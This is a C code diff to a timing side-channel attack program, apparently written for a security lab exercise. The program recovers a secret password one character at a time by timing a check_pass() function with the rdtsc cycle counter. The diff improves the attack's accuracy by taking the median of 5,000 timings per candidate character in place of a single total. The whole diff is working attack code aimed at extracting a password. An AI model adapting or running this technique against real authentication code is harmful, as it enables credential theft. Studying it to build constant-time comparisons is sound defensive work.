@@ -16,11 +16,22 @@
 
 // include our "system" header
 #include <stdbool.h>
+#include <stdlib.h>
 
 #include "sysapp.h"
 
 // Read cycle counter
 #define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })
+
+int compare_times(const void *a, const void *b) {
+    if (*(unsigned long*)a < *(unsigned long*)b) {
+        return -1;
+    }
+    if (*(unsigned long*)a > *(unsigned long*)b) {
+        return 1;
+    }
+    return 0;
+}
 
 int main(int argc, char **argv) {
     char guess[33];
@@ -28,23 +39,26 @@ int main(int argc, char **argv) {
     bzero(guess, sizeof(guess));
     int found = false;
     for (char len = 0; len<33; len++) {
-        unsigned long start_time;
         char best_letter =0;
         unsigned long best_letter_time = 0;
         char next_letter =0;
         for (next_letter=33; next_letter<=126; next_letter++) {
-            unsigned long start = rdtsc();
+            unsigned long measurements[5000];
             guess[len] = next_letter;
             for (int i=0; i<5000; i++) {
+                unsigned long start = rdtsc();
                 if (check_pass(guess)) {
                     found = true;
                     break;
                 }
+                unsigned long end = rdtsc();
+                measurements[i] = end - start;
             }
-            unsigned long end = rdtsc();
             if (found) {break;}
-            if (end-start>best_letter_time) {
-                best_letter_time = end-start;
+            qsort(measurements, 5000, sizeof(unsigned long), compare_times);
+            unsigned long median = measurements[2500];
+            if (median>best_letter_time) {
+                best_letter_time = median;
                 best_letter = next_letter;
             }
         }
